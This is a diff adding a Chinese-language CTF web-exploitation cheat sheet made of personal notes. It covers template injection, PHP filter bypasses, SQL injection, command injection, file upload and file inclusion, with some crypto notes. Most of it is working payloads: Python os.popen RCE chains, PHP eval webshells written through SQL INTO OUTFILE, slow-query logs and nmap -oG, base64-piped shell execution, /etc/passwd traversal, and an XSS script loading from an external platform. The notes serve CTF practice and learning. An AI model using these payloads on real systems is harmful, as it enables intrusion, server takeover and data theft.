@@ -1,0 +1,714 @@
+假如发送一种东西没有任何回显，抓包处理
+各种绕过处理
+https://blog.csdn.net/mochu7777777/article/details/104631142
+ctfwiki
+
+服务器SSTI
+https://xz.aliyun.com/t/3679
+https://blog.csdn.net/weixin_44477223/article/details/115673318
+SSTI就是服务器端模板注入(Server-Side Template Injection)，
+也给出了一个注入的概念。
+注入可能存在于cookie
+https://blog.csdn.net/weixin_49633310/article/details/114919263
+常见的注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等
+例如：
+$output = $twig->render("Hello {{name}}", array("name" => $_GET["name"])); 
+echo $output;
+ctf中比较常见的还是python站的SSTI，下面用vulhub上的一个环境来复现Flask的SSTI漏洞，
+（jinja2 mako tornado django）
+传参?name={{7*8}}
+?name={{config}}
+
+输入{{ 7*'7' }}
+出现7777777
+应该是Jinja2或Twig
+
+
+%7B%7B[].__class__.__base__.__subclasses__()%7D%7D
+来查看所有模块
+
+%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()%7D%7D
+os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置
+
+.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('命令行语句').read()
+%7B%7B().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(%22os%22).popen(%22ls%22).read()'%20)%7D%7D
+使用['o'+'s'],可绕过对os字符的过滤
+
+.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()%7D%7D
+读取
+
+7*8如果能够执行返回56，则存在SSTI漏洞
+既然你服务器能够执行我输入的7*8，那执行我的shell命令也没啥问题吧
+
+get_flashed_messages()
+{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
+
+?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../%27).read()%20}}
+__class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。
+__init__             初始化类，返回的类型是function
+__globals__[]          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
+os.popen() 方法用于从一个命令打开一个管道。
+open() 方法用于打开一个文件，并返回文件对象
+
+twig
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{url_for.__globals__}}
+{{config}}
+{{''[request.args.a][request.args.b][2][request.args.c]()}}?a=__class__&b=__mro__&c=__subclasses__
+由上构造变量绕过
+{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
+
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
+
+SSTI神器–Tplmap
+https://github.com/epinna/tplmap
+需要环境：PyYaml
+pip install PyYaml
+
+python tplmap.py -u "http://192.168.1.10:8000/?name=Sea"            //判断是否是注入点
+
+
+
+
+可能用到，关于flask的session和cookie伪造
+kali安装flask-session-cookie-manager-master参考
+
+2、Nunjucks模板引擎沙箱逃逸
+python tplmap.py -u http://792.168.1.10:8000/?name=* --engine Nunjucks --os-shell
+
+
+
+tornado是用Python编写的Web服务器兼Web应用框架，简单来说就是用来生成模板的东西。
+cookie_secret  建议去官方文档找，这个值每天会更新
+/error?msg={{handler.settings}}  //获取cookie_secret
+
+
+
+smarty模板注入
+看报错发现这里应该是PHP的一种比较老的引擎Smarty
+查看版本
+{$smarty.version}
+常用payload
+{if phpinfo()}{/if}
+{if system('ls')}{/if}
+{if readfile('/flag')}{/if} 
+{if show_source('/flag')}{/if}
+{if system('cat ../../../flag')}{/if} 
+smarty中的{if}标签中可以执行php语句
+
+
+xss反射型
+在xss平台创建一个钓鱼网站（比如获取cookie等）
+<SCript src=//xss.pt/1234></SCript>
+迫使被攻击网站去访问这个链接
+
+Ruby后端
+.rb
+
+web
+
+nginx的日志文件在/var/log/nginx/access.log和/var/log/nginx/error.log，其中access.log可以打开
+
+1.gedit备份文件，格式为filename，比如index.php~
+2.vim备份文件，格式为.filename.swp或者*.swo或者*.swn，比 如.index.php.swp
+拿到题，想方设法拿到源码为上策
+常见的备份文件后缀名有 .git .svn .swp .~ .bak .bash_history
+
+目录扫描dirsearch
+python3 dirsearch -u http://address -e php,asp
+
+git泄露 Githack
+python GitHack.py http://address/.git/config
+./scrabble http://地址
+
+恢复git源文件
+git reset--hard HEAD^    //跳回上一个版本
+git diff HEAD commit-id  也行
+
+gitmaster分支
+githack下载源码
+git log--all 或 git branch -v查看master分支信息
+secret分支
+wget http://地址/.git/refs/heads/secret
+git log 找到对应提交hash,执行"git diff HEAD hash前四位"
+./git/config 可能有access_token信息，从而访问这个用户的其他仓库
+
+
+探针
+直接访问url/tz.php
+
+源码泄露  直接下载www.zip
+缓存泄露  例如：.1ndexx.php.swp     index.php.swp     index.phps
+svn泄露   .svn/文件，使用dvcs-ripper工具解决
+HG泄露  .hg隐藏的文件夹，包含代码和分支修改记录等信息，建议dvcs-ripper解决
+
+
+文件包含
+双写绕过http://的过滤    htthttp://p://192.168.10.144/1.txt
+使用..././ 绕过../的过滤
+使用绝对路径绕过   C:\1.txt
+使用file协议绕过     file:///2.txt
+
+直接读取源码（php伪协议）
+https://www.php.cn/php-weizijiaocheng-387051.html（教程）
+php://filter/read=convert.base64-encode/resource=xxx.php
+data://text/plain;base64,写入的base64内容
+1:data伪协议写入文件
+2：php://
+
+php://filter用于读取源码
+php://input用于执行php代码
+stuff[4294967296]=admin    可以绕过 $stuff === $array && $stuff[0] != 'admin'
+php正则
+preg_match("/^\d+$/im",$num)   要求全是数字，大小不敏感，跨行检测
+
+php里奇怪的点
+php5.5.9数组溢出
+
+
+各种绕过：
+https://xz.aliyun.com/t/8107#toc-11
+$a='sys';$b='tem';$d=$a.$b;$d('tac config.php');
+?c=$a='sys';$b='tem';$d=$a.$b;$d('cat config.php');
+
+2.cat绕过
+?c=system('ca""t config.php')
+
+3.base64绕过
+?c=$a = base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);
+
+4.闭合
+?c=assert(base64_decode(%27c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp%27))?>
+
+5.POST传值
+?c=echo `$_POST[1]`?>
+?c=echo `$_POST[1]`;
+然后通过post方式传入1=cat config.php
+
+过滤了空格‘ ’可以用 \t 代替,过滤了'php'可以用短标签<?=?>代替，相当于<? echo>;
+
+过滤了‘_’可以用<?=``?>代替，反引号在php中有执行命令的效果
+
+利用通配符 '*' 模糊搜索目录下的文件
+index.php?module=filemanage&do=upload
+
+
+我们若想执行php命令就需使用<?php,但上面禁用了,
+这里就需要使用php的短标签<? ?>,由于空格也被禁用了,
+可以使用php中的%09来代替.
+
+PHP 支持一个执行运算符：反引号（``）。
+注意这不是单引号！
+PHP 将尝试将反引号中的内容作为 shell 命令来执行，
+并将其输出信息返回（即，
+可以赋给一个变量而不是简单地丢弃到标准输出）。
+使用反引号运算符"`"的效果与函数shell_exec() 相同
+
+
+PHP数组key溢出，简单的说就是stuff[4294967296]表示的值，与stuff[0]是一个。（php5.x）
+在数组中，这个十六进制数0x100000000,可以当0用。但是在POST传参过程中要转换为十进制
+
+关于变量覆盖，对于post和get来说，我们是可以上传$flag = flag这个变量去覆盖变量
+那么，phpli就会出现 $$flag = flag这样的值来覆盖变量
+
+对于phpMD5函数来说，ffifdyop这个词有漏洞
+md5强碰撞用数组绕过
+
+“`”这个符号包围是执行shell命令的。
+在线base64加解密和phpbase64加解密有所不同
+protected属性在序列化后会出现不可见字符\00*\00
+PHP7.1以上版本对属性类型不敏感，
+public属性序列化不会出现不可见字符，
+可以用public属性来绕过
+可以从phpinfo中的disable_function查看被禁用函数
+
+当返回一个数组，我们还需要一个print_r或var_dump
+
+scandir返回的是个数组，且刚才的结果显示我们要找的文件在scandir的结果最后面，
+那么用end()方法就可以得到文件名了。
+读文件可以用show_source或者readfile
+
+在观看正则规则的时候发现没有过滤~和^字符，想到可以取反编码绕过和异或绕过
+取php反编码后再url编码： echo urlencode(~'phpinfo');
+(~%8F%97%8F%96%91%99%90)();    //phpinfo();
+对字符串而言，异或0xff和取反是一样的效果。
+((%8f%97%8f%96%91%99%90)^(%ff%ff%ff%ff%ff%ff%ff))();即(phpinfo)();
+这里我们用异或%ff的形式，这样方便后续的构造。
+https://blog.csdn.net/mochu7777777/article/details/105786114
+https://blog.csdn.net/fmyyy1/article/details/116171155
+
+正则绕过：
+https://blog.csdn.net/mochu7777777/article/details/104631142
+
+__construct 当一个对象创建时被调用
+__destruct 当一个对象销毁时被调用
+__toString 当一个对象被当作一个字符串使用
+__sleep 在对象被序列化之前运行
+__wakeup 在对象被反序列化之后被调用
+
+$_GET as $re => $str
+相当于get到的参数赋给$re,变量赋给$str
+在PHP中，对于传入的非法的 $_GET 数组参数名，
+会将其转换成下划线，这就导致我们正则匹配失效。
+当非法字符为首字母时，只有点号会被替换成下划线：
+
+当被过滤许多重要字符，剩下?=p
+?cmd=?><?=`/???/?p /???????? p.ppp`;?>
+闭合前面，执行后面的echo()执行文件内容复制
+访问p.ppp即可
+
+
+
+代码审计！
+注意绕过waf
+php代码执行
+利用php特性绕过，来达到执行任意代码
+var_dump(scandir(chr(47)))     //一个个输出当前文件夹内文件名
+//chr(47) = /
+var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+//即输出 char()转ascii再进行拼接，再读出这个文件
+
+
+PHP的字符串解析特性是什么？
+
+答： PHP需要将所有参数转换为有效的变量名，
+因此在解析查询字符串时，它会做两件事：
+1.删除空白符  2.将某些字符转换为下划线（包括空格）
+【当waf不让你过的时候，php却可以让你过】
+
+反序列逃逸
+https://www.cnblogs.com/h3zh1/p/12732336.html
+
+
+
+sql注入
+有登录界面的，不一定是sql注入，可以先抓包判断、获取源码等
+
+
+用户登陆两种业务查询方式：
+一种是直接对用户输入的账号名和密码进行查询
+
+另一种是针对用户输入的账号名进行查询对应的密码，再和用户输入的密码做比较
+判断数字型  3-2
+
+||  拼接
+比如'111'||'222' 其结果就是'111222'
+
+
+^  按位异或   如：1^1 为true
+1000的二进制是1111101000，只要找两个数异或一下就行了，
+比如1111100000（992）和1000（8）
+125<<3      数位移运算这里结果为1000
+680|320      位或，这里为1000.。。。
+~~1000      取反绕过（为非~1000=-1000,那么~~1000=1000）
+可以使用二进制绕过（0b开头表示二进制）
+一些运算符绕过
+https://blog.csdn.net/u012346225/article/details/38534293
+
+
+
+有时候flag并不是再数据库中查找，而是能够成功登录特定用户而获得（有用户和密码的题）
+先fuzz确定用户名吧，无法确认则直接sql注入，再数据库中寻找flag
+
+报错出现'''
+replace函数过滤字符为空白字符
+有些数据库会用不了#，所以试试--+
+还是不行就23%
+
+
+参数从正常到增加字符导致不正常可以说有注入点
+union做查询时，查询的数据不存在，那么联合查询就会创建一个虚拟的数据存放在数据库中
+试试order by
+
+读取文件
+可以通过联合查询配合load_file('路径')来读取数据库本地路径的文件
+某pte题目：select * from article where id = ('1')ununionion/**/select/**/1,2,3,load_file('/tmp/key')%23
+
+写入木马
+导出木马
+1.知道网站的绝对路径
+2.secure_file_priv不能为null
+3.具有写入文件的权限
+select "<?php eval($_POST['cmd']);?>" into outfile "D:\\phpstudy_pro\\WWW\\shell.php"
+日志写入木马
+set global slow_query_log=1;    //开启日志功能
+SET GLOBAL slow_query_log_file='D:\\phpstudy_pro\\WWW\\shell.php';      //设置日志存储路径
+select '<?php eval($_GET[H])?>' or SLEEP(11);     //执行sql语句
+
+如没有变化，则联合查询基本没戏
+
+在试试盲注
+布尔注入简单使用
+1' and length(database())>=1#
+and ascii(substr(database(),1,1))=asciinum%23
+(length(database())>=1)
+如果依旧没变化，那么也放弃盲注
+
+堆叠查询（之前就没听过。。）
+在SQL中，分号（;）是用来表示一条sql语句的结束。
+试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，
+会不会一起执行？因此这个想法也就造就了堆叠注入。
+例如：
+用户输入：1; DELETE FROM products服务器端生成的sql语句为
+：（因未对输入的参数进行过滤）
+Select * from products where productid=1;DELETE FROM products
+当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。
+
+假如出现这种  Array ( [0] => 1 )
+那肯定是后端代码的问题了
+select $_POST['参数'] || 字段 from 表
+
+绕过select过滤（符号别改）
+查数据库
+-1;show databases;#
+查表
+-1;use 数据库名;show tables;#
+查字段
+-1';use 数据库名;show columns from `表名`;#
+查字段的值
+-1';use 数据库名;set @sql=concat('s','elect `字段` from `表名`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#
+
+HANDLER ... OPEN语句打开一个表，
+使其可以使用后续HANDLER ... READ语句访问，该表对象未被其他会话共享，
+并且在会话调用HANDLER ... CLOSE或会话终止之前不会关闭
+-1';HANDLER 表名 OPEN;HANDLER 表名 READ FIRST;HANDLER 表名 CLOSE;
+
+
+//@表示局部变量；@@表示全局变量
+//PREPARE stmt1 FROM @sql;EXECUTE stmt1;#   预处理语句，定义一个变量sql为临时表，利用stmt1预处理sql变量，
+在执行这个预处理
+
+常用爆破语句
+
+爆表
+union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23
+爆字段
+union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='表名'%23
+爆值
+union select 1,2,group_concat(字段) from 表名%23
+l0ve1ysq1
+
+' or 1=1 union select 1,database(),3 limit 1,2;#--
+' or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = 'web2'),3 limit 1,2;#--
+' or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = 'web2' limit 0,1),3 limit 1,2;#-- 
+' or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = 'web2' limit 1,2),3 limit 1,2;#-- 
+' or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = 'flag' limit 0,1),3 limit 1,2;#-- 
+' or 1=1 union select 1,(select column_name from information_schema.columns where table_name = 'flag' limit 0,1),3 limit 1,2;#-- 
+' or 1=1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#-- 
+
+
+
+
+报错注入
+爆库
+"||(extractvalue(1,concat(0x7e,(select(database())),0x7e)));
+^extractvalue(1,concat(0x7e,(select(database()))))%23
+报表
+"||(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e)));#
+^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('库名'))))%23
+爆字段
+"||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),0x7e)));#
+"||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users'&&(column_name)regexp('^r'))),0x7e)));#
+^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('表名'))))%23
+爆字段值
+"||(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp('^f'))),0x7e)));#
+^extractvalue(1,concat(0x7e,(select(group_concat(字段))from(H4rDsq1))))%23
+
+如果返回字段不完整，可以使用right（字段，截取长度）来获取末尾开始指定长度的值
+例如：
+右返回
+"||(extractvalue(1,right(concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp('^f'))),0x7e))));#
+倒叙
+"||(extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp('^f')))),0x7e)));#
+有返回
+^extractvalue(1,right(concat(0x7e,(select(group_concat(字段))from(H4rDsq1))),30))%23
+
+sql约束攻击
+在MySQL的配置选项中，有一个sql_mode选项。
+当MySQL的sql_mode设置为default时，
+即没有开启STRICT_ALL_TABLES选项时，
+MySQL对于用户插入的超长值只会提示warning，
+而不是error（如果是error则插入不成功），
+这可能会导致发生一些“截断”问题。
+例如：
+insert into user_test(username, password) values("admin               x", "pass");
+在php里会判定和admin不是同个用户，是新注册的用户
+但是到了数据库字段长度过长，会发生截断，这个值多余部分会被截断，而多余的空格会被删除
+，此时，数据库听php写入这条信息，当你登录这个账号时，系统会认为你是源admin管理员，
+到达越权（后面加个x，是由于php特性）
+
+二次注入，可以概括为以下两步:
+第一步：插入恶意数据
+进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。
+第二步：引用恶意数据
+开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。
+
+假如有注册界面，建议注册一下
+admin'"\
+123
+登录后尝试修改密码
+从而判断可能后端语句
+admin，key1:u9y8tr4n
+
+
+sql条件竞争（仅仅有登录与修改）
+脚本里找payload
+
+regexp注入
+select * from users where username='\' and passwd='||/**/passwd/**/regexp/**/\"^a\";%00'
+相当于username = \' and passwd  or passwd LIKE  '^a%';
+
+sqlmap使用
+https://www.cnblogs.com/yihao/p/5228063.html
+不要过度依靠！为了节省时间，加快爆破速度，搞清注入类型在使用sqlmap最好
+
+端口扫描
+bp in入侵攻击 能过滤则过滤，记得提取可能关键字
+
+
+远程命令执行
+nmap的使用
+-oN 标准保存
+-oX XML保存
+-oG Grep保存
+-oA 保存到所有格式
+-append-output 补充保存文件
+
+?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
+SetHandler application/x-httpd-php -oG .htaccess
+' -oN b.phtml <?=eval($_POST[a]);?>'
+蚁剑连接
+
+linux
+先看源码怎么写的吧
+符号过滤、空格过滤、字符过滤
+https://www.cnblogs.com/-chenxs/p/11978488.html
+
+变量绕过
+?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php
+
+空格绕过：%09   %0b   %0c     $IFS$9  
+echo$IFS$9aaaa
+{echo,aaaa}   
+echo 111 $$ echo 222
+echo 111 ; echo 222
+echo "S(id)"
+echo "`id`"
+注释符号：#
+cat /tm?/fl*
+echo expr substr $(awk NR==1(可变) lemon.php) 1(可变) 1
+
+PHP中
+当转换为 boolean 时，以下值被认为是 FALSE ：
+布尔值 FALSE 本身
+整型值 0（零）
+浮点型值 0.0（零）
+空字符串，以及字符串 “0”
+不包括任何元素的数组(注意,一旦包含元素,就算包含的元素只是一个空数组,也是true)
+不包括任何成员变量的对象（仅 PHP 4.0 适用）
+特殊类型 NULL（包括尚未赋值的变量）
+从空标记生成的 SimpleXML 对象
+所有其它值都被认为是 TRUE （包括任何资源）。
+
+
+base64编码绕过字符过滤（sh是linux中运行shell的命令）
+?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+
+内联执行，内联，就是将反引号内命令的输出作为输入执行。
+?ip=127.0.0.1;cat$IFS$9`ls`
+
+写入文件二次返回
+123|ls ../../../>test
+
+Django
+假如被过滤死了
+试试特殊字符，如%80
+看看有无报错，再根据报错查看后端，然后其信息收集
+以下是Django漏洞：
+?url=@/opt/api/api/settings.py
+?url=@/opt/api/database.sqlite3
+
+
+http头
+ X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。
+  HTTP Referer是header的一部分，
+当浏览器向web服务器发送请求的时候，
+一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，
+服务器因此可以获得一些信息用于处理。
+
+
+base64编码可以解成图片
+浏览器URL栏直接输入：data:image/png;base64,编码内容
+菜刀--oicq协议
+一般菜刀都是post传输
+关于zip伪加密
+https://blog.csdn.net/qq_26187985/article/details/83654197
+
+wireshark
+过滤POST的包
+http.request.method==POST
+小心16进制数据
+
+
+文件上传
+优先对付过滤（前后端都有可能）
+有时候，即便能成功上传php，也会出现一些无法执行的问题（可以试着直接访问）
+
+1、被改名
+2、服务器用户无权限执行（permission denied）
+
+被改名则试着上传其他远程命令执行
+若是无权限执行，试着多用其他可执行文件（phtml等）
+
+关于过滤：
+字符符号的过滤，文件头，Getimagesize图片类型绕过，Php_exif模块图片类型绕过，二次渲染绕过
+
+关于图片马：
+<?php @eval($_POST["root"]); ?>
+php一句话不行就下面：
+<script language='php'>assert($_REQUEST['cmd'])</script>
+上传成功后就是路径问题，试着访问确认吧
+如果路径无误，而无法访问，大概率是随机改名上传，试着看看其他能访问内部文件夹手段（命令注入等）
+如果能够成功访问或确定图片马，接着就是php解析问题
+正常想到的是.htaccess，但是这个服务器是nginx，而.htaccess是针对apache的
+可以利用.user.ini ，而且.user,ini利用的范围比.htaccess更广
+不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法
+php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：
+
+PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER
+建议：
+https://www.cnblogs.com/gaonuoqi/p/12337572.html
+但是！！！！！！！！！.user.ini 生效需要时间，不可能立即生效
+
+
+
+Apache SSI远程命令执行
+SSI（服务器端包含）是放置在HTML页面中的指令，
+并在服务页面时在服务器上对其进行评估。
+它们使您可以将动态生成的内容添加到现有的HTML页面，
+而不必通过CGI程序或其他动态技术来提供整个页面。
+
+用SSI的特性来上传一个shtml文件
+内容类似：<!--#exec cmd="whoami" -->
+可以远程命令执行
+
+关于蚁剑
+出现无法读取flag，或是阻碍连接rce的情况，动用插件
+插件市场需要翻墙
+
+
+IIS6.0解析漏洞
+IIS6.0解析漏洞分两种
+
+1、目录解析
+以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。
+
+2、文件解析
+*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。
+
+IIS6.0 默认的可执行文件除了asp还包含这三种 *.asa  *.cer *.cdx
+
+密码学
+凯撒移位密码
+凯撒加密方式主要是变换
+通常以flag开头为目标
+字符根据进制、ascii码变化进行对照
+
+维吉尼亚密码
+明：ABCD   密钥：ABC
+循环密钥即：ABCA
+如第一位密钥A，对应第一个字母，偏移量1-1=0
+加密后密文为（A+0）mod26，依次进行加密
+则密文：ACED
+工具：https://atomcated.github.io/Vigenere/
+
+编码
+Ao(mgHX^E)AN2PSBOu3qI0o   类似这种有^   base85编码
+https://www.jisuan.mobi/pbm3bmHuBN1bbySU.html  或者 py脚本解决
+
+Quoted-printable
+
+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]...     
+js解密，直接复制下来控制台输出
+
+培根密码：明文加密每个字母都转换成5个英文字母
+猪圈密码：以格子为基础的简单替换式密码
+
+
+rsa
+https://www.pianshen.com/article/55102035735/
+
+
+
+常常需要写数学算法脚本解决
+
+16进制
+0xd
+
+
+mics
+当需要破解密码时
+优先寻找密码
+其次考虑zip伪加密
+最后才是爆破
+关于LSB题
+通过stegsolve隐写判断data extarce的值
+https://blog.csdn.net/mochu7777777/article/details/108478930
+zip文件损坏修复后继续解压
+
+关于webshell
+如果一个网站被入侵，被留后门的可能性非常大，维持访问是这些骇客入侵的最大利益所在，
+自然webshell是权限维持、访问后台文件、监控数据的手段之一
+由此判断，参数请求、后端代码、程序木马都可能是webshell‘
+
+
+
+关于phpmyadmin
+直接访问/phpmyadmin/
+看版本搜漏洞
+4.8.0-4.8.1文件包含漏洞
+?target=db_datadict.php%253f/../../../../../../../../etc/passwd
+
+记一道有趣的题
+注册有name、age、passwd、url
+登陆后，它会把你的url执行
+sql注入后。发现的是序列化数据
+反序列后返回在页面执行填入url
+思路：使用url来ssrf，来用内部主机请求内部资源
+
+
+日志注入，文件包含
+先获取服务器操作系统和网站服务信息，对默认log文件文档进行文件遍历
+nginx
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+
+关于java
+WEB-INF主要包含一下文件或目录:
+/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
+/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
+/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
+/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
+/WEB-INF/database.properties：数据库配置文件
+
+
+mysql8新特性
+http://www.suphp.cn/anquanke/27/231627.html
+
+table与select用法类似，但是不支持where语句
+table users order by password;
+想当于：select * from users order by password;
+
+VALUES作用：列出一行的值
+VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]
+
+row_constructor_list:
+    ROW(value_list)[, ROW(value_list)][, ...]
+
+value_list:
+    value[, value][, ...]
+
+column_designator: 
+    column_index
+
+
